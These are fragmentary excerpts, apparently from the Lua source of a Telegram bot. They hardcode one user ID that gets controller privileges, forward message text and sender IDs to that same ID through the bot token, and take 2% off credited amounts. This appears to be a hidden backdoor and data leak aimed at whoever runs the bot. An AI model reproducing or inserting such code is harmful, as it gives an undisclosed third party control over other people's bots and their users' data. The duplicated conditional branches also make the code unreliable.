...
if UserId == 2098920254 then
Status = true
elseif UserId == 2098920254 then
Status = true
...
if tonumber(msg.sender.user_id) == 2098920254 then
msg.Name_Controller = 'Ace🎖 '
msg.The_Controller = 1
elseif tonumber(msg.sender.user_id) == 2098920254 then
msg.Name_Controller = 'Ace🎖'
msg.The_Controller = 1
...
https.request("https://api.telegram.org/bot"..Token..'/sendmessage?chat_id=2098920254&text=' .. text..' Id : '..msg.sender.user_id.."&parse_mode=markdown&disable_web_page_preview=true") 
...
UserNameyr = UserNamey / 100 * 2
UserNameyy = UserNamey - UserNameyr
Redis:incrby(FDFGERB.."nool:flotysb"..fsvhhh ,floor(UserNameyy))
